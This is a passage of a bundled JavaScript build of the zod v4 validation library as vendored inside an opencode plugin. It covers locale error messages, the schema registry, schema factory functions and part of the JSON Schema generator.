        return `\u7121\u6548\u7684\u6578\u5B57\uFF1A\u5FC5\u9808\u70BA ${issue3.divisor} \u7684\u500D\u6578`;
      case "unrecognized_keys":
        return `\u7121\u6CD5\u8B58\u5225\u7684\u9375\u503C${issue3.keys.length > 1 ? "\u5011" : ""}\uFF1A${joinValues2(issue3.keys, "\u3001")}`;
      case "invalid_key":
        return `${issue3.origin} \u4E2D\u6709\u7121\u6548\u7684\u9375\u503C`;
      case "invalid_union":
        return "\u7121\u6548\u7684\u8F38\u5165\u503C";
      case "invalid_element":
        return `${issue3.origin} \u4E2D\u6709\u7121\u6548\u7684\u503C`;
      default:
        return `\u7121\u6548\u7684\u8F38\u5165\u503C`;
    }
  };
};
function zh_TW_default2() {
  return {
    localeError: error90()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/yo.js
var error91 = () => {
  const Sizable = {
    string: { unit: "\xE0mi", verb: "n\xED" },
    file: { unit: "bytes", verb: "n\xED" },
    array: { unit: "nkan", verb: "n\xED" },
    set: { unit: "nkan", verb: "n\xED" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType8 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "n\u1ECD\u0301mb\xE0";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "akop\u1ECD";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u1EB9\u0300r\u1ECD \xECb\xE1w\u1ECDl\xE9",
    email: "\xE0d\xEDr\u1EB9\u0301s\xEC \xECm\u1EB9\u0301l\xEC",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\xE0k\xF3k\xF2 ISO",
    date: "\u1ECDj\u1ECD\u0301 ISO",
    time: "\xE0k\xF3k\xF2 ISO",
    duration: "\xE0k\xF3k\xF2 t\xF3 p\xE9 ISO",
    ipv4: "\xE0d\xEDr\u1EB9\u0301s\xEC IPv4",
    ipv6: "\xE0d\xEDr\u1EB9\u0301s\xEC IPv6",
    cidrv4: "\xE0gb\xE8gb\xE8 IPv4",
    cidrv6: "\xE0gb\xE8gb\xE8 IPv6",
    base64: "\u1ECD\u0300r\u1ECD\u0300 t\xED a k\u1ECD\u0301 n\xED base64",
    base64url: "\u1ECD\u0300r\u1ECD\u0300 base64url",
    json_string: "\u1ECD\u0300r\u1ECD\u0300 JSON",
    e164: "n\u1ECD\u0301mb\xE0 E.164",
    jwt: "JWT",
    template_literal: "\u1EB9\u0300r\u1ECD \xECb\xE1w\u1ECDl\xE9"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\xCCb\xE1w\u1ECDl\xE9 a\u1E63\xEC\u1E63e: a n\xED l\xE1ti fi ${issue3.expected}, \xE0m\u1ECD\u0300 a r\xED ${parsedType8(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\xCCb\xE1w\u1ECDl\xE9 a\u1E63\xEC\u1E63e: a n\xED l\xE1ti fi ${stringifyPrimitive2(issue3.values[0])}`;
        return `\xC0\u1E63\xE0y\xE0n a\u1E63\xEC\u1E63e: yan \u1ECD\u0300kan l\xE1ra ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `T\xF3 p\u1ECD\u0300 j\xF9: a n\xED l\xE1ti j\u1EB9\u0301 p\xE9 ${issue3.origin ?? "iye"} ${sizing.verb} ${adj}${issue3.maximum} ${sizing.unit}`;
        return `T\xF3 p\u1ECD\u0300 j\xF9: a n\xED l\xE1ti j\u1EB9\u0301 ${adj}${issue3.maximum}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `K\xE9r\xE9 ju: a n\xED l\xE1ti j\u1EB9\u0301 p\xE9 ${issue3.origin} ${sizing.verb} ${adj}${issue3.minimum} ${sizing.unit}`;
        return `K\xE9r\xE9 ju: a n\xED l\xE1ti j\u1EB9\u0301 ${adj}${issue3.minimum}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `\u1ECC\u0300r\u1ECD\u0300 a\u1E63\xEC\u1E63e: gb\u1ECD\u0301d\u1ECD\u0300 b\u1EB9\u0300r\u1EB9\u0300 p\u1EB9\u0300l\xFA "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `\u1ECC\u0300r\u1ECD\u0300 a\u1E63\xEC\u1E63e: gb\u1ECD\u0301d\u1ECD\u0300 par\xED p\u1EB9\u0300l\xFA "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u1ECC\u0300r\u1ECD\u0300 a\u1E63\xEC\u1E63e: gb\u1ECD\u0301d\u1ECD\u0300 n\xED "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u1ECC\u0300r\u1ECD\u0300 a\u1E63\xEC\u1E63e: gb\u1ECD\u0301d\u1ECD\u0300 b\xE1 \xE0p\u1EB9\u1EB9r\u1EB9 mu ${_issue.pattern}`;
        return `A\u1E63\xEC\u1E63e: ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `N\u1ECD\u0301mb\xE0 a\u1E63\xEC\u1E63e: gb\u1ECD\u0301d\u1ECD\u0300 j\u1EB9\u0301 \xE8y\xE0 p\xEDp\xEDn ti ${issue3.divisor}`;
      case "unrecognized_keys":
        return `B\u1ECDt\xECn\xEC \xE0\xECm\u1ECD\u0300: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `B\u1ECDt\xECn\xEC a\u1E63\xEC\u1E63e n\xEDn\xFA ${issue3.origin}`;
      case "invalid_union":
        return "\xCCb\xE1w\u1ECDl\xE9 a\u1E63\xEC\u1E63e";
      case "invalid_element":
        return `Iye a\u1E63\xEC\u1E63e n\xEDn\xFA ${issue3.origin}`;
      default:
        return "\xCCb\xE1w\u1ECDl\xE9 a\u1E63\xEC\u1E63e";
    }
  };
};
function yo_default2() {
  return {
    localeError: error91()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/core/registries.js
var $output2 = Symbol("ZodOutput");
var $input2 = Symbol("ZodInput");

class $ZodRegistry2 {
  constructor() {
    this._map = new WeakMap;
    this._idmap = new Map;
  }
  add(schema, ..._meta) {
    const meta3 = _meta[0];
    this._map.set(schema, meta3);
    if (meta3 && typeof meta3 === "object" && "id" in meta3) {
      if (this._idmap.has(meta3.id)) {
        throw new Error(`ID ${meta3.id} already exists in the registry`);
      }
      this._idmap.set(meta3.id, schema);
    }
    return this;
  }
  clear() {
    this._map = new WeakMap;
    this._idmap = new Map;
    return this;
  }
  remove(schema) {
    const meta3 = this._map.get(schema);
    if (meta3 && typeof meta3 === "object" && "id" in meta3) {
      this._idmap.delete(meta3.id);
    }
    this._map.delete(schema);
    return this;
  }
  get(schema) {
    const p = schema._zod.parent;
    if (p) {
      const pm = { ...this.get(p) ?? {} };
      delete pm.id;
      const f = { ...pm, ...this._map.get(schema) };
      return Object.keys(f).length ? f : undefined;
    }
    return this._map.get(schema);
  }
  has(schema) {
    return this._map.has(schema);
  }
}
function registry2() {
  return new $ZodRegistry2;
}
var globalRegistry2 = /* @__PURE__ */ registry2();
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/core/api.js
function _string2(Class3, params) {
  return new Class3({
    type: "string",
    ...normalizeParams2(params)
  });
}
function _coercedString2(Class3, params) {
  return new Class3({
    type: "string",
    coerce: true,
    ...normalizeParams2(params)
  });
}
function _email2(Class3, params) {
  return new Class3({
    type: "string",
    format: "email",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _guid2(Class3, params) {
  return new Class3({
    type: "string",
    format: "guid",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _uuid2(Class3, params) {
  return new Class3({
    type: "string",
    format: "uuid",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _uuidv42(Class3, params) {
  return new Class3({
    type: "string",
    format: "uuid",
    check: "string_format",
    abort: false,
    version: "v4",
    ...normalizeParams2(params)
  });
}
function _uuidv62(Class3, params) {
  return new Class3({
    type: "string",
    format: "uuid",
    check: "string_format",
    abort: false,
    version: "v6",
    ...normalizeParams2(params)
  });
}
function _uuidv72(Class3, params) {
  return new Class3({
    type: "string",
    format: "uuid",
    check: "string_format",
    abort: false,
    version: "v7",
    ...normalizeParams2(params)
  });
}
function _url2(Class3, params) {
  return new Class3({
    type: "string",
    format: "url",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _emoji4(Class3, params) {
  return new Class3({
    type: "string",
    format: "emoji",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _nanoid2(Class3, params) {
  return new Class3({
    type: "string",
    format: "nanoid",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _cuid3(Class3, params) {
  return new Class3({
    type: "string",
    format: "cuid",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _cuid22(Class3, params) {
  return new Class3({
    type: "string",
    format: "cuid2",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _ulid2(Class3, params) {
  return new Class3({
    type: "string",
    format: "ulid",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _xid2(Class3, params) {
  return new Class3({
    type: "string",
    format: "xid",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _ksuid2(Class3, params) {
  return new Class3({
    type: "string",
    format: "ksuid",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _ipv42(Class3, params) {
  return new Class3({
    type: "string",
    format: "ipv4",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _ipv62(Class3, params) {
  return new Class3({
    type: "string",
    format: "ipv6",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _cidrv42(Class3, params) {
  return new Class3({
    type: "string",
    format: "cidrv4",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _cidrv62(Class3, params) {
  return new Class3({
    type: "string",
    format: "cidrv6",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _base642(Class3, params) {
  return new Class3({
    type: "string",
    format: "base64",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _base64url2(Class3, params) {
  return new Class3({
    type: "string",
    format: "base64url",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _e1642(Class3, params) {
  return new Class3({
    type: "string",
    format: "e164",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
function _jwt2(Class3, params) {
  return new Class3({
    type: "string",
    format: "jwt",
    check: "string_format",
    abort: false,
    ...normalizeParams2(params)
  });
}
var TimePrecision2 = {
  Any: null,
  Minute: -1,
  Second: 0,
  Millisecond: 3,
  Microsecond: 6
};
function _isoDateTime2(Class3, params) {
  return new Class3({
    type: "string",
    format: "datetime",
    check: "string_format",
    offset: false,
    local: false,
    precision: null,
    ...normalizeParams2(params)
  });
}
function _isoDate2(Class3, params) {
  return new Class3({
    type: "string",
    format: "date",
    check: "string_format",
    ...normalizeParams2(params)
  });
}
function _isoTime2(Class3, params) {
  return new Class3({
    type: "string",
    format: "time",
    check: "string_format",
    precision: null,
    ...normalizeParams2(params)
  });
}
function _isoDuration2(Class3, params) {
  return new Class3({
    type: "string",
    format: "duration",
    check: "string_format",
    ...normalizeParams2(params)
  });
}
function _number2(Class3, params) {
  return new Class3({
    type: "number",
    checks: [],
    ...normalizeParams2(params)
  });
}
function _coercedNumber2(Class3, params) {
  return new Class3({
    type: "number",
    coerce: true,
    checks: [],
    ...normalizeParams2(params)
  });
}
function _int2(Class3, params) {
  return new Class3({
    type: "number",
    check: "number_format",
    abort: false,
    format: "safeint",
    ...normalizeParams2(params)
  });
}
function _float322(Class3, params) {
  return new Class3({
    type: "number",
    check: "number_format",
    abort: false,
    format: "float32",
    ...normalizeParams2(params)
  });
}
function _float642(Class3, params) {
  return new Class3({
    type: "number",
    check: "number_format",
    abort: false,
    format: "float64",
    ...normalizeParams2(params)
  });
}
function _int322(Class3, params) {
  return new Class3({
    type: "number",
    check: "number_format",
    abort: false,
    format: "int32",
    ...normalizeParams2(params)
  });
}
function _uint322(Class3, params) {
  return new Class3({
    type: "number",
    check: "number_format",
    abort: false,
    format: "uint32",
    ...normalizeParams2(params)
  });
}
function _boolean2(Class3, params) {
  return new Class3({
    type: "boolean",
    ...normalizeParams2(params)
  });
}
function _coercedBoolean2(Class3, params) {
  return new Class3({
    type: "boolean",
    coerce: true,
    ...normalizeParams2(params)
  });
}
function _bigint2(Class3, params) {
  return new Class3({
    type: "bigint",
    ...normalizeParams2(params)
  });
}
function _coercedBigint2(Class3, params) {
  return new Class3({
    type: "bigint",
    coerce: true,
    ...normalizeParams2(params)
  });
}
function _int642(Class3, params) {
  return new Class3({
    type: "bigint",
    check: "bigint_format",
    abort: false,
    format: "int64",
    ...normalizeParams2(params)
  });
}
function _uint642(Class3, params) {
  return new Class3({
    type: "bigint",
    check: "bigint_format",
    abort: false,
    format: "uint64",
    ...normalizeParams2(params)
  });
}
function _symbol2(Class3, params) {
  return new Class3({
    type: "symbol",
    ...normalizeParams2(params)
  });
}
function _undefined5(Class3, params) {
  return new Class3({
    type: "undefined",
    ...normalizeParams2(params)
  });
}
function _null5(Class3, params) {
  return new Class3({
    type: "null",
    ...normalizeParams2(params)
  });
}
function _any2(Class3) {
  return new Class3({
    type: "any"
  });
}
function _unknown2(Class3) {
  return new Class3({
    type: "unknown"
  });
}
function _never2(Class3, params) {
  return new Class3({
    type: "never",
    ...normalizeParams2(params)
  });
}
function _void3(Class3, params) {
  return new Class3({
    type: "void",
    ...normalizeParams2(params)
  });
}
function _date2(Class3, params) {
  return new Class3({
    type: "date",
    ...normalizeParams2(params)
  });
}
function _coercedDate2(Class3, params) {
  return new Class3({
    type: "date",
    coerce: true,
    ...normalizeParams2(params)
  });
}
function _nan2(Class3, params) {
  return new Class3({
    type: "nan",
    ...normalizeParams2(params)
  });
}
function _lt2(value, params) {
  return new $ZodCheckLessThan2({
    check: "less_than",
    ...normalizeParams2(params),
    value,
    inclusive: false
  });
}
function _lte2(value, params) {
  return new $ZodCheckLessThan2({
    check: "less_than",
    ...normalizeParams2(params),
    value,
    inclusive: true
  });
}
function _gt2(value, params) {
  return new $ZodCheckGreaterThan2({
    check: "greater_than",
    ...normalizeParams2(params),
    value,
    inclusive: false
  });
}
function _gte2(value, params) {
  return new $ZodCheckGreaterThan2({
    check: "greater_than",
    ...normalizeParams2(params),
    value,
    inclusive: true
  });
}
function _positive2(params) {
  return _gt2(0, params);
}
function _negative2(params) {
  return _lt2(0, params);
}
function _nonpositive2(params) {
  return _lte2(0, params);
}
function _nonnegative2(params) {
  return _gte2(0, params);
}
function _multipleOf2(value, params) {
  return new $ZodCheckMultipleOf2({
    check: "multiple_of",
    ...normalizeParams2(params),
    value
  });
}
function _maxSize2(maximum, params) {
  return new $ZodCheckMaxSize2({
    check: "max_size",
    ...normalizeParams2(params),
    maximum
  });
}
function _minSize2(minimum, params) {
  return new $ZodCheckMinSize2({
    check: "min_size",
    ...normalizeParams2(params),
    minimum
  });
}
function _size2(size, params) {
  return new $ZodCheckSizeEquals2({
    check: "size_equals",
    ...normalizeParams2(params),
    size
  });
}
function _maxLength2(maximum, params) {
  const ch = new $ZodCheckMaxLength2({
    check: "max_length",
    ...normalizeParams2(params),
    maximum
  });
  return ch;
}
function _minLength2(minimum, params) {
  return new $ZodCheckMinLength2({
    check: "min_length",
    ...normalizeParams2(params),
    minimum
  });
}
function _length2(length, params) {
  return new $ZodCheckLengthEquals2({
    check: "length_equals",
    ...normalizeParams2(params),
    length
  });
}
function _regex2(pattern, params) {
  return new $ZodCheckRegex2({
    check: "string_format",
    format: "regex",
    ...normalizeParams2(params),
    pattern
  });
}
function _lowercase2(params) {
  return new $ZodCheckLowerCase2({
    check: "string_format",
    format: "lowercase",
    ...normalizeParams2(params)
  });
}
function _uppercase2(params) {
  return new $ZodCheckUpperCase2({
    check: "string_format",
    format: "uppercase",
    ...normalizeParams2(params)
  });
}
function _includes2(includes, params) {
  return new $ZodCheckIncludes2({
    check: "string_format",
    format: "includes",
    ...normalizeParams2(params),
    includes
  });
}
function _startsWith2(prefix, params) {
  return new $ZodCheckStartsWith2({
    check: "string_format",
    format: "starts_with",
    ...normalizeParams2(params),
    prefix
  });
}
function _endsWith2(suffix, params) {
  return new $ZodCheckEndsWith2({
    check: "string_format",
    format: "ends_with",
    ...normalizeParams2(params),
    suffix
  });
}
function _property2(property, schema, params) {
  return new $ZodCheckProperty2({
    check: "property",
    property,
    schema,
    ...normalizeParams2(params)
  });
}
function _mime2(types, params) {
  return new $ZodCheckMimeType2({
    check: "mime_type",
    mime: types,
    ...normalizeParams2(params)
  });
}
function _overwrite2(tx) {
  return new $ZodCheckOverwrite2({
    check: "overwrite",
    tx
  });
}
function _normalize2(form) {
  return _overwrite2((input) => input.normalize(form));
}
function _trim2() {
  return _overwrite2((input) => input.trim());
}
function _toLowerCase2() {
  return _overwrite2((input) => input.toLowerCase());
}
function _toUpperCase2() {
  return _overwrite2((input) => input.toUpperCase());
}
function _array2(Class3, element, params) {
  return new Class3({
    type: "array",
    element,
    ...normalizeParams2(params)
  });
}
function _union2(Class3, options, params) {
  return new Class3({
    type: "union",
    options,
    ...normalizeParams2(params)
  });
}
function _discriminatedUnion2(Class3, discriminator, options, params) {
  return new Class3({
    type: "union",
    options,
    discriminator,
    ...normalizeParams2(params)
  });
}
function _intersection2(Class3, left, right) {
  return new Class3({
    type: "intersection",
    left,
    right
  });
}
function _tuple2(Class3, items, _paramsOrRest, _params) {
  const hasRest = _paramsOrRest instanceof $ZodType2;
  const params = hasRest ? _params : _paramsOrRest;
  const rest = hasRest ? _paramsOrRest : null;
  return new Class3({
    type: "tuple",
    items,
    rest,
    ...normalizeParams2(params)
  });
}
function _record2(Class3, keyType, valueType, params) {
  return new Class3({
    type: "record",
    keyType,
    valueType,
    ...normalizeParams2(params)
  });
}
function _map2(Class3, keyType, valueType, params) {
  return new Class3({
    type: "map",
    keyType,
    valueType,
    ...normalizeParams2(params)
  });
}
function _set2(Class3, valueType, params) {
  return new Class3({
    type: "set",
    valueType,
    ...normalizeParams2(params)
  });
}
function _enum3(Class3, values, params) {
  const entries = Array.isArray(values) ? Object.fromEntries(values.map((v) => [v, v])) : values;
  return new Class3({
    type: "enum",
    entries,
    ...normalizeParams2(params)
  });
}
function _nativeEnum2(Class3, entries, params) {
  return new Class3({
    type: "enum",
    entries,
    ...normalizeParams2(params)
  });
}
function _literal2(Class3, value, params) {
  return new Class3({
    type: "literal",
    values: Array.isArray(value) ? value : [value],
    ...normalizeParams2(params)
  });
}
function _file2(Class3, params) {
  return new Class3({
    type: "file",
    ...normalizeParams2(params)
  });
}
function _transform2(Class3, fn) {
  return new Class3({
    type: "transform",
    transform: fn
  });
}
function _optional2(Class3, innerType) {
  return new Class3({
    type: "optional",
    innerType
  });
}
function _nullable2(Class3, innerType) {
  return new Class3({
    type: "nullable",
    innerType
  });
}
function _default3(Class3, innerType, defaultValue) {
  return new Class3({
    type: "default",
    innerType,
    get defaultValue() {
      return typeof defaultValue === "function" ? defaultValue() : shallowClone2(defaultValue);
    }
  });
}
function _nonoptional2(Class3, innerType, params) {
  return new Class3({
    type: "nonoptional",
    innerType,
    ...normalizeParams2(params)
  });
}
function _success2(Class3, innerType) {
  return new Class3({
    type: "success",
    innerType
  });
}
function _catch3(Class3, innerType, catchValue) {
  return new Class3({
    type: "catch",
    innerType,
    catchValue: typeof catchValue === "function" ? catchValue : () => catchValue
  });
}
function _pipe2(Class3, in_, out) {
  return new Class3({
    type: "pipe",
    in: in_,
    out
  });
}
function _readonly2(Class3, innerType) {
  return new Class3({
    type: "readonly",
    innerType
  });
}
function _templateLiteral2(Class3, parts, params) {
  return new Class3({
    type: "template_literal",
    parts,
    ...normalizeParams2(params)
  });
}
function _lazy2(Class3, getter) {
  return new Class3({
    type: "lazy",
    getter
  });
}
function _promise2(Class3, innerType) {
  return new Class3({
    type: "promise",
    innerType
  });
}
function _custom2(Class3, fn, _params) {
  const norm = normalizeParams2(_params);
  norm.abort ?? (norm.abort = true);
  const schema = new Class3({
    type: "custom",
    check: "custom",
    fn,
    ...norm
  });
  return schema;
}
function _refine2(Class3, fn, _params) {
  const schema = new Class3({
    type: "custom",
    check: "custom",
    fn,
    ...normalizeParams2(_params)
  });
  return schema;
}
function _superRefine2(fn) {
  const ch = _check2((payload) => {
    payload.addIssue = (issue3) => {
      if (typeof issue3 === "string") {
        payload.issues.push(issue2(issue3, payload.value, ch._zod.def));
      } else {
        const _issue = issue3;
        if (_issue.fatal)
          _issue.continue = false;
        _issue.code ?? (_issue.code = "custom");
        _issue.input ?? (_issue.input = payload.value);
        _issue.inst ?? (_issue.inst = ch);
        _issue.continue ?? (_issue.continue = !ch._zod.def.abort);
        payload.issues.push(issue2(_issue));
      }
    };
    return fn(payload.value, payload);
  });
  return ch;
}
function _check2(fn, params) {
  const ch = new $ZodCheck2({
    check: "custom",
    ...normalizeParams2(params)
  });
  ch._zod.check = fn;
  return ch;
}
function _stringbool2(Classes, _params) {
  const params = normalizeParams2(_params);
  let truthyArray = params.truthy ?? ["true", "1", "yes", "on", "y", "enabled"];
  let falsyArray = params.falsy ?? ["false", "0", "no", "off", "n", "disabled"];
  if (params.case !== "sensitive") {
    truthyArray = truthyArray.map((v) => typeof v === "string" ? v.toLowerCase() : v);
    falsyArray = falsyArray.map((v) => typeof v === "string" ? v.toLowerCase() : v);
  }
  const truthySet = new Set(truthyArray);
  const falsySet = new Set(falsyArray);
  const _Codec = Classes.Codec ?? $ZodCodec2;
  const _Boolean = Classes.Boolean ?? $ZodBoolean2;
  const _String = Classes.String ?? $ZodString2;
  const stringSchema = new _String({ type: "string", error: params.error });
  const booleanSchema = new _Boolean({ type: "boolean", error: params.error });
  const codec2 = new _Codec({
    type: "pipe",
    in: stringSchema,
    out: booleanSchema,
    transform: (input, payload) => {
      let data = input;
      if (params.case !== "sensitive")
        data = data.toLowerCase();
      if (truthySet.has(data)) {
        return true;
      } else if (falsySet.has(data)) {
        return false;
      } else {
        payload.issues.push({
          code: "invalid_value",
          expected: "stringbool",
          values: [...truthySet, ...falsySet],
          input: payload.value,
          inst: codec2,
          continue: false
        });
        return {};
      }
    },
    reverseTransform: (input, _payload) => {
      if (input === true) {
        return truthyArray[0] || "true";
      } else {
        return falsyArray[0] || "false";
      }
    },
    error: params.error
  });
  return codec2;
}
function _stringFormat2(Class3, format, fnOrRegex, _params = {}) {
  const params = normalizeParams2(_params);
  const def = {
    ...normalizeParams2(_params),
    check: "string_format",
    type: "string",
    format,
    fn: typeof fnOrRegex === "function" ? fnOrRegex : (val) => fnOrRegex.test(val),
    ...params
  };
  if (fnOrRegex instanceof RegExp) {
    def.pattern = fnOrRegex;
  }
  const inst = new Class3(def);
  return inst;
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/core/to-json-schema.js
class JSONSchemaGenerator2 {
  constructor(params) {
    this.counter = 0;
    this.metadataRegistry = params?.metadata ?? globalRegistry2;
    this.target = params?.target ?? "draft-2020-12";
    this.unrepresentable = params?.unrepresentable ?? "throw";
    this.override = params?.override ?? (() => {});
    this.io = params?.io ?? "output";
    this.seen = new Map;
  }
  process(schema, _params = { path: [], schemaPath: [] }) {
    var _a2;
    const def = schema._zod.def;
    const formatMap2 = {
      guid: "uuid",
      url: "uri",
      datetime: "date-time",
      json_string: "json-string",
      regex: ""
    };
    const seen = this.seen.get(schema);
    if (seen) {
      seen.count++;
      const isCycle = _params.schemaPath.includes(schema);
      if (isCycle) {
        seen.cycle = _params.path;
      }
      return seen.schema;
    }
    const result = { schema: {}, count: 1, cycle: undefined, path: _params.path };
    this.seen.set(schema, result);
    const overrideSchema = schema._zod.toJSONSchema?.();
    if (overrideSchema) {
      result.schema = overrideSchema;
    } else {
      const params = {
        ..._params,
        schemaPath: [..._params.schemaPath, schema],
        path: _params.path
      };
      const parent = schema._zod.parent;
      if (parent) {
        result.ref = parent;
        this.process(parent, params);
        this.seen.get(parent).isParent = true;
      } else {
        const _json = result.schema;
        switch (def.type) {
          case "string": {
            const json2 = _json;
            json2.type = "string";
            const { minimum, maximum, format, patterns, contentEncoding } = schema._zod.bag;
            if (typeof minimum === "number")
              json2.minLength = minimum;
            if (typeof maximum === "number")
              json2.maxLength = maximum;
            if (format) {
              json2.format = formatMap2[format] ?? format;
              if (json2.format === "")
                delete json2.format;
            }
            if (contentEncoding)
              json2.contentEncoding = contentEncoding;
            if (patterns && patterns.size > 0) {
              const regexes = [...patterns];
              if (regexes.length === 1)
                json2.pattern = regexes[0].source;
              else if (regexes.length > 1) {
                result.schema.allOf = [
                  ...regexes.map((regex) => ({
                    ...this.target === "draft-7" || this.target === "draft-4" || this.target === "openapi-3.0" ? { type: "string" } : {},
                    pattern: regex.source
                  }))
                ];
              }
            }
            break;
          }
          case "number": {
            const json2 = _json;
            const { minimum, maximum, format, multipleOf, exclusiveMaximum, exclusiveMinimum } = schema._zod.bag;
            if (typeof format === "string" && format.includes("int"))
              json2.type = "integer";
            else
              json2.type = "number";
            if (typeof exclusiveMinimum === "number") {
              if (this.target === "draft-4" || this.target === "openapi-3.0") {
                json2.minimum = exclusiveMinimum;
                json2.exclusiveMinimum = true;
              } else {
                json2.exclusiveMinimum = exclusiveMinimum;
              }
            }
            if (typeof minimum === "number") {
              json2.minimum = minimum;
              if (typeof exclusiveMinimum === "number" && this.target !== "draft-4") {
                if (exclusiveMinimum >= minimum)
                  delete json2.minimum;
                else
                  delete json2.exclusiveMinimum;
              }
            }
            if (typeof exclusiveMaximum === "number") {
              if (this.target === "draft-4" || this.target === "openapi-3.0") {
                json2.maximum = exclusiveMaximum;
                json2.exclusiveMaximum = true;
              } else {
                json2.exclusiveMaximum = exclusiveMaximum;
              }
            }
            if (typeof maximum === "number") {
              json2.maximum = maximum;
              if (typeof exclusiveMaximum === "number" && this.target !== "draft-4") {
                if (exclusiveMaximum <= maximum)
                  delete json2.maximum;
                else
                  delete json2.exclusiveMaximum;
              }
            }
            if (typeof multipleOf === "number")
              json2.multipleOf = multipleOf;
            break;
          }
          case "boolean": {
            const json2 = _json;
            json2.type = "boolean";
            break;
          }
          case "bigint": {
            if (this.unrepresentable === "throw") {
              throw new Error("BigInt cannot be represented in JSON Schema");
            }
            break;
          }
          case "symbol": {
            if (this.unrepresentable === "throw") {
              throw new Error("Symbols cannot be represented in JSON Schema");
            }
            break;
          }
          case "null": {
            if (this.target === "openapi-3.0") {
              _json.type = "string";
              _json.nullable = true;
              _json.enum = [null];
            } else
              _json.type = "null";
            break;
          }
          case "any": {
            break;
          }
          case "unknown": {
            break;
          }
          case "undefined": {
            if (this.unrepresentable === "throw") {
              throw new Error("Undefined cannot be represented in JSON Schema");
            }
            break;
          }
          case "void": {
            if (this.unrepresentable === "throw") {
              throw new Error("Void cannot be represented in JSON Schema");
            }
            break;
          }
          case "never": {
            _json.not = {};
            break;
          }
          case "date": {
            if (this.unrepresentable === "throw") {
              throw new Error("Date cannot be represented in JSON Schema");
            }
            break;
          }
          case "array": {
            const json2 = _json;
            const { minimum, maximum } = schema._zod.bag;
            if (typeof minimum === "number")
              json2.minItems = minimum;
            if (typeof maximum === "number")
              json2.maxItems = maximum;
            json2.type = "array";
            json2.items = this.process(def.element, { ...params, path: [...params.path, "items"] });
            break;
          }
          case "object": {
            const json2 = _json;
            json2.type = "object";
            json2.properties = {};
            const shape = def.shape;
            for (const key in shape) {
              json2.properties[key] = this.process(shape[key], {
                ...params,
                path: [...params.path, "properties", key]
              });
            }
            const allKeys = new Set(Object.keys(shape));
            const requiredKeys = new Set([...allKeys].filter((key) => {
              const v = def.shape[key]._zod;
              if (this.io === "input") {
                return v.optin === undefined;
              } else {
                return v.optout === undefined;
              }
            }));
            if (requiredKeys.size > 0) {
              json2.required = Array.from(requiredKeys);
            }
            if (def.catchall?._zod.def.type === "never") {
              json2.additionalProperties = false;
            } else if (!def.catchall) {
              if (this.io === "output")
                json2.additionalProperties = false;
            } else if (def.catchall) {
              json2.additionalProperties = this.process(def.catchall, {
                ...params,
                path: [...params.path, "additionalProperties"]
              });
            }
            break;
          }
          case "union": {
            const json2 = _json;
            const options = def.options.map((x, i) => this.process(x, {
              ...params,
              path: [...params.path, "anyOf", i]
            }));
            json2.anyOf = options;
            break;
          }
          case "intersection": {
            const json2 = _json;
            const a = this.process(def.left, {
              ...params,
              path: [...params.path, "allOf", 0]
            });
            const b = this.process(def.right, {
              ...params,
              path: [...params.path, "allOf", 1]
            });
            const isSimpleIntersection = (val) => ("allOf" in val) && Object.keys(val).length === 1;
            const allOf = [
              ...isSimpleIntersection(a) ? a.allOf : [a],
              ...isSimpleIntersection(b) ? b.allOf : [b]
            ];
            json2.allOf = allOf;
            break;
          }
          case "tuple": {
            const json2 = _json;
            json2.type = "array";
            const prefixPath = this.target === "draft-2020-12" ? "prefixItems" : "items";
            const restPath = this.target === "draft-2020-12" ? "items" : this.target === "openapi-3.0" ? "items" : "additionalItems";
            const prefixItems = def.items.map((x, i) => this.process(x, {
              ...params,
              path: [...params.path, prefixPath, i]
